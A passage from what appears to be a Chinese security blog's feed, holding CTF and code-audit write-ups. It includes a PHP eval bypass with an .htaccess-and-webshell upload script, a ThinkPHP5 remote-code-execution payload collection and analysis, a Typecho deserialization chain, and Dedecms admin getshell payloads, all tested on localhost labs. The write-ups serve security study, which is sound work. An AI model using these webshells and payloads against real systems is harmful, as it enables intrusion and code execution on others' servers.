list(pstr)):            tmp=i^j            <span class="hljs-keyword">if</span> chr(tmp)==<span class="hljs-string">"_"</span>:                temp=[]                temp.append(temphex(j)[<span class="hljs-number">2</span>:]+<span class="hljs-string">"^"</span>+temphex(i)[<span class="hljs-number">2</span>:])                _.append(temp)            <span class="hljs-keyword">if</span> chr(tmp)==<span class="hljs-string">"G"</span>:                temp=[]                temp.append(temphex(j)[<span class="hljs-number">2</span>:]+<span class="hljs-string">"^"</span>+temphex(i)[<span class="hljs-number">2</span>:])                G.append(temp)            <span class="hljs-keyword">if</span> chr(tmp)==<span class="hljs-string">"E"</span>:                temp=[]                temp.append(temphex(j)[<span class="hljs-number">2</span>:]+<span class="hljs-string">"^"</span>+temphex(i)[<span class="hljs-number">2</span>:])                E.append(temp)            <span class="hljs-keyword">if</span> chr(tmp)==<span class="hljs-string">"T"</span>:                temp=[]                temp.append(temphex(j)[<span class="hljs-number">2</span>:]+<span class="hljs-string">"^"</span>+temphex(i)[<span class="hljs-number">2</span>:])                T.append(temp)print(_)print(G)print(E)print(T)</code></pre><p>随便拿个payload</p><pre><code class="hljs perl">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">8877</span>/?<span class="hljs-number">_</span>=$&#123;%80%80%80%80^%df%c7%c5%d4&#125;&#123;%df&#125;();&amp;%df=phpinfo</code></pre><p>这里由于eval函数只能解析一便代码，不能传入</p><pre><code class="hljs llvm">http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8877</span>/?_=$&#123;<span class="hljs-symbol">%80</span><span class="hljs-symbol">%80</span><span class="hljs-symbol">%80</span><span class="hljs-symbol">%80</span>^<span class="hljs-symbol">%df</span><span class="hljs-symbol">%c7</span><span class="hljs-symbol">%c5</span><span class="hljs-symbol">%d4</span>&#125;&#123;<span class="hljs-symbol">%df</span>&#125;&amp;<span class="hljs-symbol">%df</span>=phpinfo()<span class="hljs-comment">;</span></code></pre><h2 id="上传htaccess"><a href="#上传htaccess" class="headerlink" title="上传htaccess"></a>上传htaccess</h2><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><span class="hljs-comment"># Description : create and bypass file upload filter with .htaccess</span><span class="hljs-comment"># Author : Thibaud Robin</span><span class="hljs-comment"># Will prove the file is a legit xbitmap file and the size is 1337x1337</span><span class="hljs-comment">#SIZE_HEADER = b"\n\n#define width 1337\n#define height 1337\n\n"</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">generate_php_file</span><span class="hljs-params">(filename, script)</span>:</span>    phpfile = open(filename, <span class="hljs-string">'wb'</span>)     phpfile.write(SIZE_HEADER)    phpfile.write(script.encode(<span class="hljs-string">'utf-16be'</span>))        phpfile.close()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">generate_htacess</span><span class="hljs-params">()</span>:</span>    htaccess = open(<span class="hljs-string">'.htaccess'</span>, <span class="hljs-string">'wb'</span>)    htaccess.write(SIZE_HEADER)    htaccess.write(<span class="hljs-string">b'AddType application/x-httpd-php .ppp\n'</span>)    htaccess.write(<span class="hljs-string">b'php_value zend.multibyte 1\n'</span>)    htaccess.write(<span class="hljs-string">b'php_value zend.detect_unicode 1\n'</span>)    htaccess.write(<span class="hljs-string">b'php_value display_errors 1\n'</span>)    htaccess.close()        generate_htacess()generate_php_file(<span class="hljs-string">"webshell.ppp"</span>, <span class="hljs-string">"&lt;?php eval($_GET['cmd']); die(); ?&gt;"</span>)</code></pre><p>上传<code>.htaccess</code>后上传webshell.ppp</p><p>EXP<br>直接使用requests扩展上传</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requestsurl=<span class="hljs-string">"http://127.0.0.1:8877/?_=$&#123;%80%80%80%80^%df%c7%c5%d4&#125;&#123;%df&#125;();&amp;%df=get_the_flag"</span><span class="hljs-comment">#file=open("/home/osword/Desktop/.htaccess","rb")</span>file=open(<span class="hljs-string">"/home/osword/Desktop/webshell.ppp"</span>,<span class="hljs-string">"rb"</span>)files=&#123;<span class="hljs-string">'file'</span>:file&#125;response=requests.post(url,files=files)file.close()<span class="hljs-keyword">print</span> response.status_code<span class="hljs-keyword">print</span> response.request.body<span class="hljs-keyword">print</span> <span class="hljs-string">'--------------------------------'</span><span class="hljs-keyword">print</span> response.text</code></pre><p><img src="./1566634092815.png" srcset="/img/loading.gif" alt=""></p><h2 id="disbale-functions过滤不全"><a href="#disbale-functions过滤不全" class="headerlink" title="disbale_functions过滤不全"></a>disbale_functions过滤不全</h2><p><a href="http://127.0.0.1:8877/upload/tmp_2ff4fb82e497844a03adf28cf6bedfde/webshell.ppp?cmd=ini_set(%27open_basedir%27,%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);ini_set(%27open_basedir%27,%27/%27);var_dump(scandir(%27/%27)" target="_blank" rel="noopener">http://127.0.0.1:8877/upload/tmp_2ff4fb82e497844a03adf28cf6bedfde/webshell.ppp?cmd=ini_set(%27open_basedir%27,%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);ini_set(%27open_basedir%27,%27/%27);var_dump(scandir(%27/%27)</a>);</p><p><img src="./1566635928733.png" srcset="/img/loading.gif" alt=""></p><p><a href="http://127.0.0.1:8877/upload/tmp_2ff4fb82e497844a03adf28cf6bedfde/webshell.ppp?cmd=ini_set(%27open_basedir%27,%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);ini_set(%27open_basedir%27,%27/%27);readfile(%27/THis_Is_tHe_F14g%27)" target="_blank" rel="noopener">http://127.0.0.1:8877/upload/tmp_2ff4fb82e497844a03adf28cf6bedfde/webshell.ppp?cmd=ini_set(%27open_basedir%27,%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);ini_set(%27open_basedir%27,%27/%27);readfile(%27/THis_Is_tHe_F14g%27)</a>;</p><p><img src="./1566635895793.png" srcset="/img/loading.gif" alt=""></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.smi1e.top/php%E4%B8%8D%E4%BD%BF%E7%94%A8%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E5%92%8C%E4%B8%8B%E5%88%92%E7%BA%BF%E5%86%99shell/" target="_blank" rel="noopener">https://www.smi1e.top/php%E4%B8%8D%E4%BD%BF%E7%94%A8%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E5%92%8C%E4%B8%8B%E5%88%92%E7%BA%BF%E5%86%99shell/</a></p><p><a href="https://blog.zeddyu.info/2019/07/20/isitdtu-2019/" target="_blank" rel="noopener">https://blog.zeddyu.info/2019/07/20/isitdtu-2019/</a></p><p><a href="https://www.cnblogs.com/wfzWebSecuity/p/11373037.html" target="_blank" rel="noopener">https://www.cnblogs.com/wfzWebSecuity/p/11373037.html</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Thinkphp5 远程代码执行(二)</title>
    <link href="/2019/07/30/Thinkphp5-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E4%BA%8C/"/>
    <url>/2019/07/30/Thinkphp5-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E4%BA%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="tp5路由复习"><a href="#tp5路由复习" class="headerlink" title="tp5路由复习"></a>tp5路由复习</h1><blockquote><p>一. 注册和读取路由规则的关键代码在 think\App类的routeCheck方法<br>二.路由检查<br>下面的代码就是获取当前请求类型的路由规则<br>$method = $request-&gt;method();<br>// 获取当前请求类型的路由规则<br>$rules = self::$rules[$method];<br>三.路由检测(checkRoute方法)/Route.php第908行</p></blockquote><ol><li>路由参数检查</li><li>对路由请求的有效性进行检查</li><li>路由变量检查</li><li>路由规则匹配检查</li><li>路由别名检查</li><li>域名部署检测</li><li>路由绑定检查</li><li>静态路由检查</li><li>路由解析</li></ol><p><strong>路由解析</strong>的主要工作就是解析匹配到的路由规则中定义的路由地址（例如控制器的操作方法或者闭包等），并且解析URL地址中的其它路由参数以及路由绑定的其它数据，而且会把相关信息和变量保存到当前请求对象中，最后会告诉系统下一步如何对URL请求进行正确的调度执行，这个时候路由的使命全部完成，正式交权给App类。</p><h1 id="payload集合"><a href="#payload集合" class="headerlink" title="payload集合"></a>payload集合</h1><pre><code class="hljs php"><span class="hljs-comment"># ThinkPHP &lt;= 5.0.13</span>POST /?s=index/indexs=whoami&amp;_method=__construct&amp;method=&amp;filter[]=system<span class="hljs-comment"># ThinkPHP &lt;= 5.0.23、5.1.0 &lt;= 5.1.16 需要开启框架app_debug</span>POST /_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=ls -al<span class="hljs-comment"># ThinkPHP &lt;= 5.0.23 需要存在xxx的method路由，例如captcha</span>POST /?s=xxx HTTP/<span class="hljs-number">1.1</span>_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=ls+-al_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=ls</code></pre><h1 id="版本和漏洞分析"><a href="#版本和漏洞分析" class="headerlink" title="版本和漏洞分析"></a>版本和漏洞分析</h1><p>变量覆盖、路由未受限制、未过滤<br>tp5.0.22</p><h1 id="DEBUG开启模式下"><a href="#DEBUG开启模式下" class="headerlink" title="DEBUG开启模式下"></a>DEBUG开启模式下</h1><p>payload:<code>_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=ls -al</code></p><p><img src="./1.png" srcset="/img/loading.gif" alt=""></p><p><strong>App.php 第116行</strong>进入路由检测,调用对象为<code>$request为\think\Request</code>,跟进routeCheck方法。<br><strong>第642行</strong>调用路由检测方法check，/Route.php第857行Request类调用<code>method()</code>方法，单步跟进。<br><code>var_method</code>默认配置为<strong>method，由于`$_POST[‘</strong>method’]=’__construct’`，第526行直接调用request构造方法</p><p><img src="./2.png" srcset="/img/loading.gif" alt=""></p><p><strong>Request.php第139行</strong>遍历<code>$_POST</code>数组，且这里$name为类变量，实现变量覆盖。<br><img src="./3.png" srcset="/img/loading.gif" alt=""></p><p>因为<strong>Request类</strong>中会对外部变量调用<strong>filter过滤器</strong>，其中内置调用<code>call_user_func</code>可以达到远程代码执行的目的。<br>当开启<code>debug</code>,会调用<code>log类</code>记录变量信息。<br><img src="./4.png" srcset="/img/loading.gif" alt=""></p><p>跟进<strong>param方法</strong>，调用进入<strong>method方法</strong>.接着进入<strong>server方法</strong>,而该方法调用<code>input</code>.<br>input方法会解析过滤器和调用过滤器<br><strong>解析过滤器getFilter=&gt;调用Request对象中filter</strong><br><img src="./5.png" srcset="/img/loading.gif" alt=""></p><p><strong>filterValue方法</strong>为调用过滤器，其中$data值为<code>$this-&gt;server</code>传入且键值必须为<code>&quot;REQUEST_METHOD&quot;(</code>由入口方法input可知)<br><strong>filter为解析过滤器返回$this-&gt;filter</strong>.<br>上诉<code>$this-&gt;server</code>、<code>$this-&gt;filter</code>都可以通过上面描述的<strong>变量覆盖</strong>打到<code>filterValue</code>方法中的<code>call_user_func</code>，达到远程代码执行的目的<br><img src="./6.png" srcset="/img/loading.gif" alt=""></p><h1 id="未开启debug模式"><a href="#未开启debug模式" class="headerlink" title="未开启debug模式"></a>未开启debug模式</h1><p>在<strong>App.php下第139行exec方法</strong>,当<code>$dispatch[&#39;type&#39;]=值为&#39;method&#39;</code>调用<strong>param方法</strong>。<strong>远程执行代码</strong></p><p><img src="./7.png" srcset="/img/loading.gif" alt=""></p><p>需要执行<strong>method回调方法</strong>需调用存在类且路由规则在执行<code>get、post等</code>请求时候是回调某个方法。<br><strong>路由规则方式四</strong>满足，全局搜索看是否有这样定义的路由规则,只有<code>captcha</code>扩展带有此路由规则<br><img src="./8.png" srcset="/img/loading.gif" alt=""><br><img src="./9.png" srcset="/img/loading.gif" alt=""></p><p><strong>App.php第637</strong>执行完<strong>import方法</strong>，导入<strong>captch路由规则</strong></p><p><img src="./10.png" srcset="/img/loading.gif" alt=""></p><p><code>$dispatch</code>值由调用<strong>routeCheck方法</strong>后的<code>result</code>返回值决定,<br>result值调用栈<br><img src="./11.png" srcset="/img/loading.gif" alt=""></p><p><strong>parseRule方法</strong>执行后返回<code>result</code>值<br><img src="./12.png" srcset="/img/loading.gif" alt=""><br>payload:<code>_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=ls -al&amp;method=get</code><br><img src="./13.png" srcset="/img/loading.gif" alt=""></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://mochazz.github.io/2019/04/09/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C10/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90" target="_blank" rel="noopener">ThinkPHP5漏洞分析之代码执行(十)</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Typecho反序列化漏洞</title>
    <link href="/2019/07/29/Typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <url>/2019/07/29/Typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="toString调用trick"><a href="#toString调用trick" class="headerlink" title="__toString调用trick"></a>__toString调用trick</h1><pre><code class="hljs perl"><span class="hljs-number">1</span>. echo($obj)/<span class="hljs-keyword">print</span>($obj)<span class="hljs-number">2</span>. <span class="hljs-string">"i am &#123;$obj&#125;"</span> / <span class="hljs-string">'test'</span>.$obj<span class="hljs-number">3</span>. <span class="hljs-keyword">sprintf</span>(<span class="hljs-string">"i am %s"</span>,$obj)<span class="hljs-number">4</span>. <span class="hljs-keyword">if</span>($obj == <span class="hljs-string">'admin'</span>)</code></pre><h1 id="反序列化复习"><a href="#反序列化复习" class="headerlink" title="反序列化复习"></a>反序列化复习</h1><p>摘自<a href="https://blog.riskivy.com/%e6%8c%96%e6%8e%98%e6%9a%97%e8%97%8fthinkphp%e4%b8%ad%e7%9a%84%e5%8f%8d%e5%ba%8f%e5%88%97%e5%88%a9%e7%94%a8%e9%93%be/" target="_blank" rel="noopener">挖掘暗藏ThinkPHP中的反序列利用链</a></p><h2 id="1-在PHP反序列化的过程中会自动执行一些魔术方法"><a href="#1-在PHP反序列化的过程中会自动执行一些魔术方法" class="headerlink" title="1.在PHP反序列化的过程中会自动执行一些魔术方法"></a>1.在PHP反序列化的过程中会自动执行一些魔术方法</h2><pre><code class="hljs sqf">方法名 调用条件<span class="hljs-variable">__call</span> 调用不可访问或不存在的方法时被调用<span class="hljs-variable">__callStatic</span> 调用不可访问或不存在的静态方法时被调用<span class="hljs-variable">__clone</span> 进行对象clone时被调用，用来调整对象的克隆行为<span class="hljs-variable">__constuct</span> 构建对象的时被调用；<span class="hljs-variable">__debuginfo</span> 当调用var_dump()打印对象时被调用（当你不想打印所有属性）适用于PHP5.<span class="hljs-number">6</span>版本<span class="hljs-variable">__destruct</span> 明确销毁对象或脚本结束时被调用；<span class="hljs-variable">__get</span> 读取不可访问或不存在属性时被调用<span class="hljs-variable">__invoke</span> 当以函数方式调用对象时被调用<span class="hljs-variable">__isset</span> 对不可访问或不存在的属性调用isset()或empty()时被调用<span class="hljs-variable">__set</span> 当给不可访问或不存在属性赋值时被调用<span class="hljs-variable">__set_state</span> 当调用var_export()导出类时，此静态方法被调用。用<span class="hljs-variable">__set_state</span>的返回值做为var_export的返回值。<span class="hljs-variable">__sleep</span> 当使用serialize时被调用，当你不需要保存大对象的所有数据时很有用<span class="hljs-variable">__toString</span> 当一个类被转换成字符串时被调用<span class="hljs-variable">__unset</span> 对不可访问或不存在的属性进行unset时被调用<span class="hljs-variable">__wakeup</span> 当使用unserialize时被调用，可用于做些对象的初始化操作</code></pre><h2 id="2-反序列化的常见起点"><a href="#2-反序列化的常见起点" class="headerlink" title="2.反序列化的常见起点"></a>2.反序列化的常见起点</h2><pre><code class="hljs properties"><span class="hljs-attr">__wakeup</span> <span class="hljs-string">一定会调用</span><span class="hljs-attr">__destruct</span> <span class="hljs-string">一定会调用</span><span class="hljs-attr">__toString</span> <span class="hljs-string">当一个对象被反序列化后又被当做字符串使用</span></code></pre><h2 id="3-反序列化的常见中间跳板"><a href="#3-反序列化的常见中间跳板" class="headerlink" title="3.反序列化的常见中间跳板:"></a>3.反序列化的常见中间跳板:</h2><pre><code class="hljs php">__toString 当一个对象被当做字符串使用__get 读取不可访问或不存在属性时被调用__set 当给不可访问或不存在属性赋值时被调用__isset 对不可访问或不存在的属性调用<span class="hljs-keyword">isset</span>()或<span class="hljs-keyword">empty</span>()时被调用形如 <span class="hljs-keyword">$this</span>-&gt;$func();</code></pre><h2 id="4-反序列化的常见终点"><a href="#4-反序列化的常见终点" class="headerlink" title="4.反序列化的常见终点:"></a>4.反序列化的常见终点:</h2><pre><code class="hljs properties"><span class="hljs-attr">__call</span> <span class="hljs-string">调用不可访问或不存在的方法时被调用</span><span class="hljs-attr">call_user_func</span> <span class="hljs-string">一般php代码执行都会选择这里</span><span class="hljs-attr">call_user_func_array</span> <span class="hljs-string">一般php代码执行都会选择这里</span></code></pre><h2 id="5-Phar反序列化原理以及特征"><a href="#5-Phar反序列化原理以及特征" class="headerlink" title="5.Phar反序列化原理以及特征"></a>5.Phar反序列化原理以及特征</h2><p>phar://伪协议会在多个函数中反序列化其metadata部分<br>受影响的函数包括不限于如下:</p><pre><code class="hljs ceylon">copy,file<span class="hljs-number">_</span><span class="hljs-keyword">exists</span>,file<span class="hljs-number">_</span>get<span class="hljs-number">_</span>contents,file<span class="hljs-number">_p</span>ut<span class="hljs-number">_</span>contents,file,fileatime,filectime,filegroup,fileinode,filemtime,fileowner,fileperms,fopen,<span class="hljs-keyword">is</span><span class="hljs-number">_</span>dir,<span class="hljs-keyword">is</span><span class="hljs-number">_</span>executable,<span class="hljs-keyword">is</span><span class="hljs-number">_f</span>ile,<span class="hljs-keyword">is</span><span class="hljs-number">_</span>link,<span class="hljs-keyword">is</span><span class="hljs-number">_</span>readable,<span class="hljs-keyword">is</span><span class="hljs-number">_</span>writable,<span class="hljs-keyword">is</span><span class="hljs-number">_</span>writeable,parse<span class="hljs-number">_</span>ini<span class="hljs-number">_f</span>ile,readfile,stat,unlink,exif<span class="hljs-number">_</span>thumbnailexif<span class="hljs-number">_</span>imagetype,imageloadfontimagecreatefrom,hash<span class="hljs-number">_</span>hmac<span class="hljs-number">_f</span>ilehash<span class="hljs-number">_f</span>ilehash<span class="hljs-number">_u</span>pdate<span class="hljs-number">_f</span>ilemd<span class="hljs-number">5_f</span>ilesha<span class="hljs-number">1_f</span>ile,get<span class="hljs-number">_m</span>eta<span class="hljs-number">_</span>tagsget<span class="hljs-number">_</span>headers,getimagesizegetimagesizefromstring,extractTo</code></pre><h1 id="Typecho"><a href="#Typecho" class="headerlink" title="Typecho"></a>Typecho</h1><p>Typecho基于PHP5开发，支持多种数据库，是一款内核强健﹑扩展方便﹑体验友好﹑运行流畅的轻量级开源博客程序。</p><h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>install.php存在可控反序列化点</p><h1 id="POP挖掘"><a href="#POP挖掘" class="headerlink" title="POP挖掘"></a>POP挖掘</h1><p>前期绕过参考<a href="https://mochazz.github.io/2018/09/12/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1Day11%20-%20unserialize%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90" target="_blank" rel="noopener">代码审计Day11 - unserialize反序列化漏洞</a></p><p>install.php下<code>Typecho_Cookie::get(&#39;__typecho_config&#39;)</code>获取键值为<code>__typecho_config</code> cookie值,即<code>$config</code>可控<br><img src="./1.png" srcset="/img/loading.gif" alt=""></p><h1 id="反序列化入口"><a href="#反序列化入口" class="headerlink" title="反序列化入口"></a>反序列化入口</h1><p>跟进<code>$config</code>变量代入的类<code>Typecho_Db</code>,第128行对<code>$adapterName</code>字符串拼接，(<code>$adapterName</code>值由<code>$config[&#39;adapter&#39;]</code>赋值可控)，所以搜索全局查看<code>__toString</code>调用的类。<br><img src="./2.png" srcset="/img/loading.gif" alt=""></p><h1 id="反序列化中间跳板"><a href="#反序列化中间跳板" class="headerlink" title="反序列化中间跳板"></a>反序列化中间跳板</h1><p>有三个类存在<code>__toString()</code></p><p><strong>/var/Typecho/Config.php</strong><br>调用了<code>serizlize</code>，没有<code>__sleep</code>可利用或为下一个跳板</p><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">return</span> serialize(<span class="hljs-keyword">$this</span>-&gt;_currentConfig);&#125;</code></pre><p><strong>/var/Tyecho/Db/Query.php</strong><br>构造最终查询语句,不知道咋利用，没有发现可以触发魔术方法的操作</p><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">switch</span> (<span class="hljs-keyword">$this</span>-&gt;_sqlPreBuild[<span class="hljs-string">'action'</span>]) &#123;        <span class="hljs-keyword">case</span> Typecho_Db::SELECT:            <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;_adapter-&gt;parseSelect(<span class="hljs-keyword">$this</span>-&gt;_sqlPreBuild);        <span class="hljs-keyword">case</span> Typecho_Db::INSERT:            <span class="hljs-keyword">return</span> <span class="hljs-string">'INSERT INTO '</span>            . <span class="hljs-keyword">$this</span>-&gt;_sqlPreBuild[<span class="hljs-string">'table'</span>]            . <span class="hljs-string">'('</span> . implode(<span class="hljs-string">' , '</span>, array_keys(<span class="hljs-keyword">$this</span>-&gt;_sqlPreBuild[<span class="hljs-string">'rows'</span>])) . <span class="hljs-string">')'</span>            . <span class="hljs-string">' VALUES '</span>            . <span class="hljs-string">'('</span> . implode(<span class="hljs-string">' , '</span>, array_values(<span class="hljs-keyword">$this</span>-&gt;_sqlPreBuild[<span class="hljs-string">'rows'</span>])) . <span class="hljs-string">')'</span>            . <span class="hljs-keyword">$this</span>-&gt;_sqlPreBuild[<span class="hljs-string">'limit'</span>];        <span class="hljs-keyword">case</span> Typecho_Db::DELETE:            <span class="hljs-keyword">return</span> <span class="hljs-string">'DELETE FROM '</span>            . <span class="hljs-keyword">$this</span>-&gt;_sqlPreBuild[<span class="hljs-string">'table'</span>]            . <span class="hljs-keyword">$this</span>-&gt;_sqlPreBuild[<span class="hljs-string">'where'</span>];        <span class="hljs-keyword">case</span> Typecho_Db::UPDATE:            $columns = <span class="hljs-keyword">array</span>();            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;_sqlPreBuild[<span class="hljs-string">'rows'</span>])) &#123;                <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;_sqlPreBuild[<span class="hljs-string">'rows'</span>] <span class="hljs-keyword">as</span> $key =&gt; $val) &#123;                    $columns[] = <span class="hljs-string">"$key = $val"</span>;                &#125;            &#125;            <span class="hljs-keyword">return</span> <span class="hljs-string">'UPDATE '</span>            . <span class="hljs-keyword">$this</span>-&gt;_sqlPreBuild[<span class="hljs-string">'table'</span>]            . <span class="hljs-string">' SET '</span> . implode(<span class="hljs-string">' , '</span>, $columns)            . <span class="hljs-keyword">$this</span>-&gt;_sqlPreBuild[<span class="hljs-string">'where'</span>];        <span class="hljs-keyword">default</span>:            <span class="hljs-keyword">return</span> <span class="hljs-keyword">NULL</span>;    &#125;&#125;</code></pre><p><strong>/var/Typecho/Feed.php</strong><br>存在调用类变量，且$item由_items可控，当调用一个类不存在的变量会调用__get方法，全局搜索是否有可利用类.<br><img src="./3.png" srcset="/img/loading.gif" alt=""></p><p>大部分都只是<code>return</code> 字符串没有可以<code>getshell</code>或<strong>跳板</strong><br><strong>/var/Typecho/Request.php</strong>下<code>__get</code>调用最终方法<code>_applyFilter</code>会调用<code>call_user_func</code>且其中的变量为类变量可控.<br><img src="./4.png" srcset="/img/loading.gif" alt=""></p><h1 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h1><p><img src="./5.png" srcset="/img/loading.gif" alt=""><br><img src="./6.png" srcset="/img/loading.gif" alt=""></p><h1 id="一些补充点"><a href="#一些补充点" class="headerlink" title="一些补充点"></a>一些补充点</h1><p>这里<code>items[&#39;category&#39;]=Array(new Exception())</code>做下分析<br>当传入<code>exp</code>程序在字符串拼接反序列化成功之后会，继续往下走如果下面<code>if</code>语句不满足会直接按给定的<code>error</code>信息输出，这样无法回显<code>getshell</code>结果.</p><p><img src="./7.png" srcset="/img/loading.gif" alt=""></p><p>若在<strong>Feed.php</strong>处exp接着向下执行<br>不存在<code>$category[&#39;name&#39;]</code>,程序爆<code>error</code>终止程序，但由于没有<code>try...catch</code>等错误处理机制，会输出堆栈中的数据。</p><p><img src="./8.png" srcset="/img/loading.gif" alt=""></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结　"></a>总结　</h1><p>反序列化挺有趣，主要要理清反序列开头、跳板、终点.</p>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Dedecms后台getshell漏洞集合</title>
    <link href="/2019/07/28/Dedecms%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/"/>
    <url>/2019/07/28/Dedecms%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>复现<strong>Dedecms v5.7</strong>后台geshell漏洞感觉比以前轻松了，估计难得框架接触多了。QAQ…<br>该cms中还有多出后台getshell这里就列几个比较有意思的。</p><h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>dedecms后台存在多处fwrite函数导致getshell</p><h1 id="payload-1"><a href="#payload-1" class="headerlink" title="payload[1]"></a>payload[1]</h1><p>payload:<a href="http://127.0.0.1/cms/dedecms/uploads/dede/sys_verifies.php?action=getfiles&amp;refiles[]=\\%22;phpinfo();//" target="_blank" rel="noopener">http://127.0.0.1/cms/dedecms/uploads/dede/sys_verifies.php?action=getfiles&amp;refiles[]=\\%22;phpinfo();//</a></p><p><img src="./1.png" srcset="/img/loading.gif" alt=""></p><p><code>refiles[]</code>变量虽被<code>addslashes</code>转义，但<code>foreach</code>中对<code>$filename substr</code>截取<br>写入<code>filename</code>到<strong>modifytmp.inc</strong>文件中</p><p><img src="./2.png" srcset="/img/loading.gif" alt=""></p><p><strong>modifytmp.inc文件内容</strong><br><img src="./3.png" srcset="/img/loading.gif" alt=""></p><p>加载的模板文件调用变量<code>$doneStr</code>写入路径指向<strong>sys_verifies.php?action=down&amp;curfile=0</strong><br>跟进<code>action=down</code>操作,<code>require_once</code>包含<strong>modifytmp.inc执行代码</strong><br><img src="./4.png" srcset="/img/loading.gif" alt=""></p><h1 id="Payload-2"><a href="#Payload-2" class="headerlink" title="Payload[2]"></a>Payload[2]</h1><p>payload: 127.0.0.1/cms/dedecms/uploads/dede/stepselect_main.php?action=addenum_save&amp;ename=233&amp;issign=1&amp;egroup=;phpinfo();$</p><p><a href="http://127.0.0.1/cms/dedecms/uploads/data/enums/;phpinfo();$.php" target="_blank" rel="noopener">http://127.0.0.1/cms/dedecms/uploads/data/enums/;phpinfo();$.php</a></p><p><img src="./5.png" srcset="/img/loading.gif" alt=""></p><p>/dede/stepselect_main.php下<code>WriteEnumsCache</code>方法执行对<code>$egroup</code>变量缓存下入操作</p><p>缓存文件名：<code>$cachefile = DEDEDATA.&#39;/enums/&#39;.$egroup.&#39;.php&#39;; =&gt; /enums/;phpinfo();$.php</code><br><code>fwrite</code>写入操作对<code>$egroup</code>变量进行拼接,<code>&#39;$em_&#39;.&#39;;phpinfo();$&#39;.&#39;s&#39;;</code></p><p><img src="./6.png" srcset="/img/loading.gif" alt=""></p><h1 id="payload-3"><a href="#payload-3" class="headerlink" title="payload[3]"></a>payload[3]</h1><p>payload3:<a href="http://127.0.0.1/cms/dedecms/uploads/dede/tpl.php?action=savetagfile&amp;token=[你的Token]&amp;filename=od0d.lib.php&amp;content=%3C?php%20phpinfo();?%3E" target="_blank" rel="noopener">http://127.0.0.1/cms/dedecms/uploads/dede/tpl.php?action=savetagfile&amp;token=[你的Token]&amp;filename=od0d.lib.php&amp;content=%3C?php%20phpinfo();?%3E</a></p><p><code>$content = stripslashes($content);</code>对文件内容进行处理<br><code>stripslashes()</code> 函数删除由<code>addslashes()</code> 函数添加的反斜杠,不影响文件内容.</p><p><img src="./7.png" srcset="/img/loading.gif" alt=""></p><p><code>token</code>值获取，可以全局搜下哪里生成<code>$_SESSION[&#39;token&#39;]</code>，恰巧<code>action=upload</code>执行之后会生成token。访问复制<code>token</code>即可<br><img src="./8.png" srcset="/img/loading.gif" alt=""></p><p><a 